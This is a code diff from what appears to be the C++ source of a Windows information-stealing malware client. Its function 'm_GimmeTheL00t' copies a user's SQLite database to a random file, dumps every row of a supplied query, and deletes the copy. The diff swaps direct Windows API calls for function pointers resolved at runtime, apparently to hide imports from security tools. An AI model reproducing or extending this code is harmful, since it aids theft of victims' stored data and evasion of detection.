@@ -1,41 +1,47 @@
 #include "mod_info.hpp"
+#include "cliente.hpp"
 #include "misc.hpp"
+
+extern Cliente* cCliente;
 
 std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuery, const char* cPath) {
 	std::vector<std::vector<std::string>> vcOut;
 	std::string strRandomPath = RandomID(7);
-	if (::CopyFileA((LPCSTR)cPath, (LPCSTR)strRandomPath.c_str(), FALSE)) {
-		sqlite3* db;
+	if (cCliente->KERNEL32.pCopyFileA) {
+		if (cCliente->KERNEL32.pCopyFileA((LPCSTR)cPath, (LPCSTR)strRandomPath.c_str(), FALSE)) {
+			sqlite3* db;
 
-		int iRet = sqlite3_open(strRandomPath.c_str(), &db);
-
-		if (iRet == SQLITE_OK) {
-			sqlite3_stmt* pStmt;
-
-			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
+			int iRet = sqlite3_open(strRandomPath.c_str(), &db);
 
 			if (iRet == SQLITE_OK) {
-				iRet = sqlite3_step(pStmt);
-				while (iRet == SQLITE_ROW) {
-					int iColumnCount = sqlite3_column_count(pStmt);
-					std::vector<std::string> vcTemp;
-					if (iColumnCount > 0) {
-						for (int index = 0; index < iColumnCount; index++) {
-							vcTemp.push_back(reinterpret_cast<const char*>(sqlite3_column_text(pStmt, index)));
-						}
-					}
-					vcOut.push_back(vcTemp);
-					iRet = sqlite3_step(pStmt);
-				}
-			}
-			sqlite3_finalize(pStmt);
-			sqlite3_close(db);
-		}
-	} else {
-		_DBG_("No se pudo copiar la bd del usuario ", GetLastError());
-	}
-	::DeleteFile(strRandomPath.c_str());
+				sqlite3_stmt* pStmt;
 
+				iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
+
+				if (iRet == SQLITE_OK) {
+					iRet = sqlite3_step(pStmt);
+					while (iRet == SQLITE_ROW) {
+						int iColumnCount = sqlite3_column_count(pStmt);
+						std::vector<std::string> vcTemp;
+						if (iColumnCount > 0) {
+							for (int index = 0; index < iColumnCount; index++) {
+								vcTemp.push_back(reinterpret_cast<const char*>(sqlite3_column_text(pStmt, index)));
+							}
+						}
+						vcOut.push_back(vcTemp);
+						iRet = sqlite3_step(pStmt);
+					}
+				}
+				sqlite3_finalize(pStmt);
+				sqlite3_close(db);
+			}
+		}else {
+			_DBG_("No se pudo copiar la bd del usuario ", GetLastError());
+		}
+		if (cCliente->KERNEL32.pDeleteFileA) {
+			cCliente->KERNEL32.pDeleteFileA(strRandomPath.c_str());
+		}
+	}
 	return vcOut;
 }
 
